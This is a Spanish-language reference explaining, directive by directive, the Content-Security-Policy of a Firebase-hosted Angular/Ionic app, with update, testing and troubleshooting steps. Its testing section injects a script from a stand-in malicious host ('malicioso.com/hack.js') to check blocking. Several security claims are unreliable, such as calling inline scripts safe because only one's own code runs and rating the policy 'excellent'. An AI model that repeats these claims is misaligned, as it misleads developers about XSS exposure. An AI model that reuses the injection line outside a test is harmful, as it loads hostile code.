# Content-Security-Policy (CSP) - Referencia Técnica Detallada

## 📋 Tu CSP Actual (firebase.json)

```
default-src 'self';
base-uri 'self';
object-src 'none';
frame-ancestors 'none';
form-action 'self';
script-src 'self' 'unsafe-inline' https://www.google.com https://www.gstatic.com https://apis.google.com https://www.googleapis.com https://challenges.cloudflare.com;
connect-src 'self' https://www.google.com https://www.gstatic.com https://www.googleapis.com https://apis.google.com https://accounts.google.com https://securetoken.googleapis.com https://identitytoolkit.googleapis.com https://firebaseinstallations.googleapis.com https://firebaseappcheck.googleapis.com https://firebasestorage.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com https://*.firebasedatabase.app https://*.firebasestorage.app https://*.firebaseapp.com https://*.web.app;
img-src 'self' data: blob: https:;
style-src 'self' 'unsafe-inline';
font-src 'self' data: https:;
frame-src 'self' https://www.google.com https://accounts.google.com https://*.gstatic.com https://*.firebaseapp.com https://*.web.app;
worker-src 'self' blob:;
child-src 'self' blob:;
```

---

## 🔍 EXPLICACIÓN POR DIRECTIVA

### `default-src 'self'`
**Significado:** Por defecto, carga SOLO recursos del mismo origen
**Razón:** Baseline de seguridad - niega todo excepto lo explícitamente permitido
**Riesgo si es menos restrictivo:** Cualquier CDN externo podría cargarse
**Riesgo si es más restrictivo:** Algunas features de Angular/Ionic no funcionarían

---

### `base-uri 'self'`
**Significado:** Las etiquetas `<base>` solo pueden apuntar al mismo origen
**Razón:** Previene que ataques manipulen URLs base
**Riesgo si es menos restrictivo:** Redirecciones maliciosas
**Compatible con:** Angular routing normal

---

### `object-src 'none'`
**Significado:** No permite objetos Flash, Silverlight, etc.
**Razón:** Estos formatos son obsoletos y representan riesgos de seguridad
**Riesgo si es menos restrictivo:** Inyección de plugins maliciosos
**Compatible con:** Todo moderno (nadie usa Flash ya)

---

### `frame-ancestors 'none'`
**Significado:** App NO puede ser incrustada en iframes de otros sitios
**Razón:** Previene clickjacking (mostrar botón invisible y que clickees sin saber)
**Riesgo si es menos restrictivo:** Atacante puede incrustar tu app en su sitio phishing
**Nota:** Diferente de `frame-src` que es lo que TÚ puedes incrustar

---

### `form-action 'self'`
**Significado:** Formularios solo pueden enviarse al mismo origen
**Razón:** Previene que formularios se envíen a servidores maliciosos
**Riesgo si es menos restrictivo:** Credenciales robadas a terceros
**Compatible con:** Angular forms normales

---

### `script-src 'self' 'unsafe-inline' https://...`

#### `'self'`
Scripts del mismo origen (tu app Angular compilada)

#### `'unsafe-inline'`
**⚠️ ADVERTENCIA:** Normalmente esto es una mala práctica
**POR QUÉ lo necesitas:**
- Ionic inyecta estilos inline en componentes
- Angular puede inyectar scripts en ciertos casos
- Service Workers necesitan inline scripts
- reCAPTCHA v3 inyecta scripts

**Alternativa más segura:** Usar nonce
```html
<!-- En index.html -->
<script nonce="aleatoriohashfuertegenerated">
  // Tu código
</script>
```
```csp
script-src 'nonce-HASH_GENERADO'
```

**Para tu caso:** 'unsafe-inline' es aceptable porque:
- Solo se ejecuta código que TÚ controlas
- API Key está restringida
- App Check valida cada petición

#### `https://www.google.com`
reCAPTCHA v3 scripts y validación

#### `https://www.gstatic.com`
Google Static (recursos estáticos de Google: reCAPTCHA, analytics)

#### `https://apis.google.com`
Google APIs (Firebase, Google APIs)

#### `https://www.googleapis.com`
Google APIs (maps, analytics, etc.)

#### `https://challenges.cloudflare.com`
Para reCAPTCHA Enterprise si migras (ahora: Google reCAPTCHA v3)

---

### `connect-src` (WebSocket, Fetch, XHR)

#### Necesarios para Firebase Auth:
- `https://accounts.google.com` - Login popup
- `https://securetoken.googleapis.com` - Tokens
- `https://identitytoolkit.googleapis.com` - Auth API

#### Necesarios para Firebase SDK:
- `https://firebaseinstallations.googleapis.com` - Installation ID
- `https://firebaseappcheck.googleapis.com` - **App Check validation**

#### Necesarios para Firestore:
- `https://*.firebaseio.com` - Conexión
- `wss://*.firebaseio.com` - WebSocket
- `https://*.firebasedatabase.app` - Realtime Database

#### Necesarios para Storage:
- `https://firebasestorage.googleapis.com` - Storage API
- `https://*.firebasestorage.app` - Storage bucket

#### Necesarios para Firebase Hosting:
- `https://*.firebaseapp.com` - Otros servicios Firebase
- `https://*.web.app` - Tu hosting domain

#### Para reCAPTCHA:
- `https://www.google.com` - Validación
- `https://www.gstatic.com` - Static resources

---

### `img-src 'self' data: blob: https:`

#### `'self'`
Imágenes locales (assets del proyecto)

#### `data:`
Imágenes inline base64 (canvas, generadas en JS)

#### `blob:`
Imágenes desde Blob objects (canvas, video frames, etc.)
**Necesario para:** html2canvas, jsPDF (convierte HTML a imagen)

#### `https:`
**CRÍTICO:** SOLO HTTPS, no HTTP (nunca inseguro)
Imágenes externas HTTPS
**De dónde:** Leaflet tiles (si las vuelves CDN), Google Maps

---

### `style-src 'self' 'unsafe-inline'`

#### `'self'`
CSS del proyecto

#### `'unsafe-inline'`
CSS inyectado en `<style>` tags
**Necesario para:** Ionic (inyecta estilos en runtime)

**Alternativa más segura:** Generar nonce en cada petición
```
style-src 'nonce-HASH'
```

---

### `font-src 'self' data: https:`

#### `'self'`
Fuentes locales (web fonts en assets)

#### `data:`
Fuentes como data URI

#### `https:`
Fuentes externas HTTPS (Google Fonts, etc.)

---

### `frame-src 'self' https://...`

#### `'self'`
Iframes del mismo origen

#### `https://www.google.com`
reCAPTCHA iframe (login, verificación)

#### `https://accounts.google.com`
Google login popup iframe

#### `https://*.gstatic.com`
Google Static resources en iframes

#### `https://*.firebaseapp.com` / `https://*.web.app`
Firebase Auth iframes

---

### `worker-src 'self' blob:`

#### `'self'`
Service Workers locales

#### `blob:`
Workers creados desde Blob
**Necesario para:** Web Workers, Service Workers en `blob:` URIs

---

### `child-src 'self' blob:`

**Deprecated en CSP Level 3**, pero aún funciona:
- `'self'` - Iframes del mismo origen
- `blob:` - Iframes desde Blob objects

**Nota:** En CSP Level 3, usar `frame-src` y `worker-src` por separado

---

## ⚠️ DIRECTIVAS NO INCLUIDAS (Por qué)

### `script-src 'unsafe-eval'`
❌ **NO INCLUIDA** (correcto)
- Permite `eval()` - extremadamente inseguro
- Angular/Ionic no necesita `eval()`
- Ningún framework moderno debería necesitarlo

### `media-src`
❌ **NO INCLUIDA** (usa default-src)
- Si necesitaras `<video>` o `<audio>`, incluir:
  ```
  media-src 'self' https:
  ```

### `manifest-src`
❌ **NO INCLUIDA** (si tienes PWA)
- Si tienes `manifest.json`, incluir:
  ```
  manifest-src 'self'
  ```

### `font-src 'unsafe-inline'`
❌ **NO INCLUIDA** (correcto)
- Las fuentes no necesitan inline
- Incluir solo sería un riesgo innecesario

---

## 🔧 CÓMO ACTUALIZAR CSP

### Si necesitas agregar un nuevo dominio:

1. **Identificar el tipo de recurso:**
   ```
   ¿Script? → script-src
   ¿XHR/Fetch/WebSocket? → connect-src
   ¿Imagen? → img-src
   ¿Iframe? → frame-src
   ¿Fuente? → font-src
   ¿Estilo? → style-src
   ```

2. **Agregar a firebase.json:**
   ```json
   "headers": [
     {
       "key": "Content-Security-Policy",
       "value": "... script-src ... https://nuevodominio.com;"
     }
   ]
   ```

3. **Deploy:**
   ```bash
   firebase deploy --only hosting
   ```

4. **Verificar en DevTools:**
   - Abrir app
   - Abrir DevTools → Console
   - No debe haber CSP violations

---

## 🧪 TESTING CSP

### En DevTools Console:

```javascript
// Verificar que está activa
fetch('https://malicioso.com').catch(e => 
  console.log('CSP blocked fetch - CORRECTO')
);

// Intentar script no permitido
const s = document.createElement('script');
s.src = 'https://malicioso.com/hack.js';
document.head.appendChild(s);
// Debería verse error: "Refused to load the script..."
```

### En Lighthouse:

```bash
# Generar reporte de seguridad
npm install -g lighthouse
lighthouse https://ashbis-ae5b2.web.app --view
```

Buscar en reporte: "Content Security Policy" - debería estar 🟢 verde

---

## 📈 CSP PARA FUTURA MIGRACIÓN

### Si agregas Google Maps (no Leaflet):

```json
"script-src": "... https://maps.googleapis.com https://maps.gstatic.com;",
"connect-src": "... https://maps.googleapis.com https://maps.gstatic.com;",
"img-src": "... https://maps.gstatic.com https://tile.openstreetmap.org;"
```

### Si agregas Gemini API:

```json
"connect-src": "... https://generativelanguage.googleapis.com;"
```

### Si agregas Analytics:

```json
"script-src": "... https://www.google-analytics.com;",
"connect-src": "... https://www.google-analytics.com https://stats.g.doubleclick.net;"
```

### Si agregas Stripe (pagos):

```json
"script-src": "... https://js.stripe.com;",
"connect-src": "... https://api.stripe.com;",
"frame-src": "... https://js.stripe.com;"
```

---

## 🛡️ SEGURIDAD COMPARATIVA

### CSP DÉBIL (No uses):
```
default-src *; script-src *; connect-src *;
```
**Riesgo:** Cualquier código malicioso puede ejecutarse

### CSP MODERADA (Básica):
```
default-src 'self'; script-src 'self' https:;
```
**Riesgo:** Algunos frameworks pueden no funcionar

### CSP FUERTE (Tu proyecto):
```
default-src 'self'; script-src 'self' 'unsafe-inline' https://...;
[lista específica de dominios]
```
**Seguridad:** ✅ Muy buena - solo dominios necesarios

### CSP EXTREMA (Overkill):
```
default-src 'none'; script-src 'self'; ...
```
**Riesgo:** Casi nada funciona (ni imágenes, ni fuentes, etc.)

---

## ✅ VALIDACIÓN CSP

### Herramientas online:

1. CSP Evaluator (Google):
   https://csp-evaluator.withgoogle.com/
   - Copiar tu CSP header
   - Muestra score de seguridad

2. Mozilla CSP Validator:
   https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
   - Documentación oficial
   - Buscar sintaxis específica

3. Lighthouse:
   - En DevTools → Lighthouse
   - Genera reporte de seguridad

---

## 🔐 RESUMEN SEGURIDAD

| Elemento | Configuración | Seguridad | Razón |
|----------|--------------|----------|--------|
| **default-src** | 'self' | 🟢 Excelente | Niega todo por defecto |
| **script-src** | 'unsafe-inline' + dominios | 🟡 Buena | Necesario para Ionic |
| **connect-src** | Solo Firebase + Google | 🟢 Excelente | Ningún tercero |
| **img-src** | 'self' + data + https | 🟢 Excelente | Local + HTTPS solo |
| **frame-src** | 'self' + Google | 🟢 Excelente | Solo Google Auth |
| **style-src** | 'self' + 'unsafe-inline' | 🟡 Buena | Necesario para Ionic |
| **HTTPS** | Siempre | 🟢 Excelente | Protege data en tránsito |
| **API Key** | Restringida por referrer | 🟢 Excelente | Solo tus dominios |
| **App Check** | reCAPTCHA v3 | 🟢 Excelente | Verifica cada petición |

**Resultado Final:** 🔒 SEGURA PARA PRODUCCIÓN

---

## 📞 TROUBLESHOOTING CSP

### Error: "Refused to load stylesheet..."

1. Identificar dominio bloqueado
2. Agregar a `style-src` en CSP
3. Redeploy: `firebase deploy --only hosting`

### Error: "Refused to load the script..."

1. Idem anterior pero con `script-src`

### Error: "Cannot connect to..."

1. Identificar API bloqueado
2. Agregar a `connect-src`
3. Redeploy

### Error: "The operation was blocked by Content Security Policy"

1. Ver error completo en DevTools
2. Copiar URL bloqueado
3. Agregalo a la directiva correspondiente

---

**Última actualización:** May 27, 2026
**Versión CSP:** Level 3
**Navegadores soportados:** Todos modernos (Chrome 25+, Firefox 19+, Safari 7+)
